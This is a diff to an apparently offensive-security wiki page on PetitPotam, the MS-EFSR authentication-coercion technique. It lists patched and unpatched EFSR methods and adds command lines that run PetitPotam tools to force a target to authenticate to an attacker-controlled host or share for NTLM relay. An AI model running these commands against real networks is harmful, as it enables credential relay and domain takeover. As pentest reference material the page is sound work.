@@ -8,9 +8,10 @@ In 2019, Google's Project Zero research team found and reported a bug on MS-EFSR
 
 While the wider implications of this bug, AD-DS-wise, were only suspected, in 2021, [Gilles LIONEL](https://twitter.com/topotam77/status/1416833996923809793) used that bug to remotely coerce domain-joined machine's authentication. **The coerced authentications are made over SMB**. But MS-EFSR abuse can be combined with [WebClient abuse](webclient.md) to elicit incoming authentications made over HTTP which heighten [NTLM relay](../ntlm/relay.md) capabilities.
 
-{% hint style="warning" %}
-At the time of writing (14th December 2021), this bug has not been [fully addressed](https://blog.0patch.com/2021/08/free-micropatches-for-petitpotam.html) by Microsoft as other functions of the same protocol were detected vulnerable.
-{% endhint %}
+The following MS-EFSR's methods were detected vulnerable
+
+* `EfsRpcOpenFileRaw` and `EfsRpcEncryptFileSrv` ([patched by Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942))
+* `EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv`, `EfsRpcQueryUsersOnFile`, `EfsRpcQueryRecoveryAgents`, `EfsRpcRemoveUsersFromFile`, `EfsRpcAddUsersToFile`, `EfsRpcFileKeyInfo`, `EfsRpcDuplicateEncryptionInfoFile`, `EfsRpcAddUsersToFileEx` (unpatched at the time of this article update, 29th December 2021)
 
 ## Practice
 
@@ -20,8 +21,14 @@ An authentication can be forced with the original author's proof-of-concepts dub
 Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
 ```
 
+An alternative Python implementation ([https://github.com/ly4k/PetitPotam](https://github.com/ly4k/PetitPotam)) can be used to exploit other unpatched methods that the original implementation doesn't feature.
+
+```bash
+petitpotam.py -method AddUsersToFile $TARGET_IP '\\$ATTACKER_IP\share\foo'
+```
+
 {% hint style="info" %}
-**Nota bene**: coerced NTLM authentications made over SMB restrict the possibilites of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
+**Nota bene**: coerced NTLM authentications made over SMB restrict the possibilities of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
 {% endhint %}
 
 {% hint style="success" %}
@@ -37,3 +44,7 @@ Petitpotam.py $ATTACKER_IP $TARGET_IP
 {% embed url="https://www.exploit-db.com/exploits/47115" %}
 
 {% embed url="https://github.com/topotam/PetitPotam" %}
+
+{% embed url="https://github.com/ly4k/PetitPotam" %}
+&#x20;
+{% endembed %}
